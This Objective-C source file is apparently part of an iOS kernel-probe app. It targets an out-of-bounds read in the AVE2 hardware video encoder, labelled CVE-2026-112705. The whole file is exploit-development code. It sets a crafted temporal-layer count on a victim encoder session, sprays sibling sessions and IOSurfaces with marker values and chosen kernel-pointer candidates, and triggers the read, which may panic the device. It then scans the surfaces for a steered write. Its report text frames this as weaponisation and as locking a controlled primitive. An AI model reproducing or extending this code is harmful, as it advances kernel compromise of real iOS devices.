#import "KPAuditAVESpriteModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <dlfcn.h>

@interface KPAuditAVESpriteModule ()
@property (nonatomic, assign) int sprayCount;
@property (nonatomic, assign) uint32_t marker;
@property (nonatomic, assign) int ntl;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVESpriteModule

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
    return [self initWithSprayCount:count marker:marker ntl:16463];
}

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker ntl:(int)ntl {
    self = [super init];
    if (self) {
        _sprayCount = count;
        _marker = marker;
        _ntl = ntl;
        _identifier = [NSString stringWithFormat:@"ave112705.sprite%d.armed", count];
        _title = [NSString stringWithFormat:@"AVE2 sprite x%d", count];
        _subtitle = [NSString stringWithFormat:
                     @"CVE-2026-112705: shape OOB read with pointer candidates (NTL=%d)", ntl];
        _icon = @"square.grid.3x3.middle.filled";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave-sprite-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave-sprite] %@", line];
}

- (VTCompressionSessionRef)makeSessionWidth:(int)w height:(int)h {
    VTCompressionSessionRef session = NULL;
    OSStatus s = VTCompressionSessionCreate(kCFAllocatorDefault, w, h,
                                            kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL,
                                            NULL, NULL, &session);
    return (s == noErr) ? session : NULL;
}

- (CVPixelBufferRef)makeBufferWidth:(int)w height:(int)h {
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)h);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)h / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AVE2 sprite probe ===\n"];
    [report appendString:@"Weaponization question: does the OOB read consume SHAPED memory?\n"];
    [report appendString:@"Oracle: after the victim's panic, far/x0 shows what was read.\n"];
    [report appendString:@"  far=0x59               -> spray missed (baseline signature)\n"];
    [report appendString:@"  far low dword = 0x59 with high dword = marker bits -> partial hit\n"];
    [report appendString:@"  far contains marker 0x{marker} -> neighbour is OURS, pointer ours.\n"];
    [report appendString:@"Order: victim session FIRST, spray AFTER (OOB reads forward),\n"];
    [report appendString:@"       then encode the victim (NTL=16463 => may reboot the device).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
    [report appendFormat:@"marker=0x%08x spray=%d\n", self.marker, self.sprayCount];

    const int32_t W = 1280, H = 720;
    const int32_t sw = 64, sh = 64;

    // x0 candidates — exactly the addresses the steered NTL band (15967..16014)
    // computes: ((NTL-16463) << 32) | 0x59 with the high dword in kheap
    // 0xfffffe10..0xfffffe3f. Storing these in siblings lets a shaped OOB read
    // return a value WE chose — a controlled pointer into stp x0, x0, [x0].
    uint64_t x0cands[8];
    int ncand = 0;
    for (uint32_t hi = 0x10; hi <= 0x38; hi += 0x08) {
        x0cands[ncand++] = ((uint64_t)(uint32_t)(0xFFFFFE00u + hi) << 32) | 0x59ULL;
    }
    [report appendString:@"x0 candidates in spray:\n"];
    for (int c = 0; c < ncand; c++) {
        [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
    }

    // 1) VICTIM session first — its pInfo is allocated BEFORE the spray,
    //    so spray siblings land after it in the zone (forward OOB reads them).
    VTCompressionSessionRef victim = [self makeSessionWidth:W height:H];
    if (!victim) {
        [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
        return report;
    }
    int ntl = self.ntl;
    VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
    int usage = 1;
    VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d", ntl]];

    // 2) SPRAY siblings — same driver, same pInfo allocation class.
    //    Each sibling carries the marker in several int-valued properties so
    //    whichever field the OOB u64 picks up, it looks like ours.
    int32_t marker = (int32_t)self.marker;
    NSMutableArray *siblings = [NSMutableArray array];
    for (int i = 0; i < self.sprayCount; i++) {
        VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
        if (!s) continue;
        // two adjacent ints of the same marker build the u64 marker||marker
        VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(marker));
        // every second sibling carries a full-width pointer candidate in the
        // 64-bit-capable int fields — the shaped read then returns OUR x0
        if ((i & 1) == 0) {
            int64_t pv = (int64_t)x0cands[i % ncand];
            VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
            VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
        }
        [siblings addObject:[NSValue valueWithPointer:s]];
    }
    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x ntl=%d",
                   (int)siblings.count, self.marker, ntl]];

    // Dense fixed-page spray (strategy doc): own the pages at 0xfffffeXX00000059
    // so a steered write lands in OUR buffers and can be scanned afterwards.
    typedef void *(*SpriteISCreateFn)(CFDictionaryRef);
    typedef int (*SpriteISLockFn)(void *, uint32_t, uint32_t *);
    typedef int (*SpriteISUnlockFn)(void *, uint32_t, uint32_t *);
    typedef void *(*SpriteISGetBaseFn)(void *);
    typedef size_t (*SpriteISGetSizeFn)(void *);
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    SpriteISCreateFn sIsCreate = isLib ? (SpriteISCreateFn)dlsym(isLib, "IOSurfaceCreate") : NULL;
    SpriteISLockFn sIsLock = isLib ? (SpriteISLockFn)dlsym(isLib, "IOSurfaceLock") : NULL;
    SpriteISUnlockFn sIsUnlock = isLib ? (SpriteISUnlockFn)dlsym(isLib, "IOSurfaceUnlock") : NULL;
    SpriteISGetBaseFn sIsGetBase = isLib ? (SpriteISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress") : NULL;
    SpriteISGetSizeFn sIsGetSize = isLib ? (SpriteISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize") : NULL;
    CFMutableArrayRef surfArray = NULL;
    if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
        surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        for (int s = 0; s < 32; s++) {
            NSDictionary *props = @{
                @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = sIsCreate((__bridge CFDictionaryRef)props);
            if (surf) { CFArrayAppendValue(surfArray, surf); CFRelease(surf); }
        }
    }
    [report appendFormat:@"fixed-page spray: %ld surfaces\n",
     surfArray ? (long)CFArrayGetCount(surfArray) : 0L];

    // 3) VICTIM encode — the OOB read fires here. May panic the kernel.
    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
    [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d (panic expected; far shows the consumed bytes)", ntl]];
    if (pb) {
        VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
    }
    [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];

    // Scan the fixed-page spray for the stp x0,x0,[x0] signature: the written
    // qwords equal x0 (a candidate) or the marker pair.
    if (surfArray) {
        long hits = 0;
        CFIndex scount = CFArrayGetCount(surfArray);
        for (CFIndex si = 0; si < scount; si++) {
            void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
            uint32_t seed = 0;
            if (sIsLock(surf, 0, &seed) != 0) continue;
            uint8_t *base = (uint8_t *)sIsGetBase(surf);
            size_t sz = sIsGetSize(surf);
            if (base && sz >= 32) {
                for (size_t off = 0; off + 32 <= sz; off += 8) {
                    uint64_t q = *(uint64_t *)(base + off);
                    int match = -1;
                    for (int c = 0; c < ncand; c++) {
                        if (q == x0cands[c]) { match = c; break; }
                    }
                    uint64_t markerPair = ((uint64_t)(uint32_t)marker << 32) | (uint32_t)marker;
                    if (match < 0 && q == markerPair) match = 100 + (int)(q & 0xff);
                    if (match >= 0) {
                        uint64_t q2 = *(uint64_t *)(base + off + 8);
                        uint32_t z = *(uint32_t *)(base + off + 0x18);
                        [report appendFormat:@"    SURFACE HIT surf=%ld off=0x%zx q=0x%llx q2=0x%llx z=0x%x match=%d\n",
                         (long)si, off, q, q2, z, match];
                        hits++;
                        if (hits >= 8) break;
                    }
                }
            }
            sIsUnlock(surf, 0, &seed);
            if (hits >= 8) break;
        }
        [report appendFormat:@"fixed-page scan: %ld hit(s) in %ld surfaces\n", hits, (long)scount];
        CFRelease(surfArray);
    } else {
        [report appendString:@"fixed-page scan: skipped (IOSurface dlsym unavailable)\n"];
    }

    for (NSValue *v in siblings) {
        VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
        CFRelease((VTCompressionSessionRef)v.pointerValue);
    }
    if (pb) CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(victim);
    CFRelease(victim);

    [report appendFormat:@"\nsessions_created=%d\n", (int)siblings.count];
    [report appendString:@"\nVERDICT: "];
    [report appendString:@"SEE_JOURNAL_AND_PANIC_FAR\n"];
    [report appendString:
     @"If the device panicked: pull panic-full and read far/x0.\n"
     @"  far=0x59 -> spray did not shape the OOB read; try a different object\n"
     @"             class (kalloc size matching the pInfo zone) or more volume.\n"
     @"  far != 0x59 -> OUR data was consumed. Compare against the marker to\n"
     @"             locate the exact field and lock the primitive.\n"];
    return report;
}

@end
